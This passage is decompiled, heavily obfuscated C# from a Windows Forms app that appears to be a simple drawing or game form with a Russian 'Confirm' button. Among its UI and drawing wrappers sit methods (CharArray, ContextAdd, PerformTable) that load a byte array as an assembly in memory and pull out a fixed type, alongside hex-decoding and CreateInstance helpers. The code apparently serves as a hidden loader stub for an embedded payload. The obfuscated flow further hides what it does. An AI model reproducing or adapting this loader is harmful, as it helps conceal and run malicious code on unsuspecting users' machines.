						num4 = 1930368578;
					}
					continue;
				}
				case 20u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -125804114) ^ -1137326204;
					continue;
				case 19u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1179551945) ^ -122078211;
					continue;
				case 18u:
					num = ((int)num2 * -1242319821) ^ -1605455842;
					continue;
				case 17u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -49487352) ^ 0x69BD0F94;
					continue;
				case 16u:
					num = (int)(num2 * 2024592453) ^ -330564164;
					continue;
				case 15u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 1699511634) ^ -176871718;
					continue;
				case 14u:
					num = (int)((num2 * 2079929579) ^ 0x3245218D);
					continue;
				case 13u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 256105780) ^ 0x67A7335E);
					continue;
				case 12u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -873722800) ^ 0x6725CAEC;
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)(num2 * 1368875730) ^ -1716883491;
					continue;
				case 10u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 805759516) ^ 0x256E3566);
					continue;
				case 9u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -51529560) ^ -1840525806;
					continue;
				case 8u:
					num = (int)(num2 * 1068725125) ^ -322361137;
					continue;
				case 7u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -782918332) ^ 0x42A8553C;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 85788939) ^ 0x32D5ED11);
					continue;
				case 5u:
					num = 185602682;
					continue;
				case 4u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -1687020569) ^ -2143950659;
					continue;
				case 3u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -120437439) ^ -1916618995;
					continue;
				case 2u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1849240969) ^ -465608943;
					continue;
				case 1u:
					num = ((int)num2 * -1634974118) ^ 0x8A684DD;
					continue;
				case 0u:
					num = (int)(num2 * 270633582) ^ -1819916092;
					continue;
				default:
					return;
				case 73u:
					break;
				case 34u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
		while (true)
		{
			int num = 448676823;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6724A666u) % 3u)
				{
				case 1u:
					goto IL_000f;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000f:
				num = (int)(num2 * 2020189609) ^ -1558010353;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 778568383;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x111967E4u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)(num2 * 704061646) ^ -480737078;
					continue;
				case 0u:
					num = ((int)num2 * -1629278186) ^ 0x5AAE293D;
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
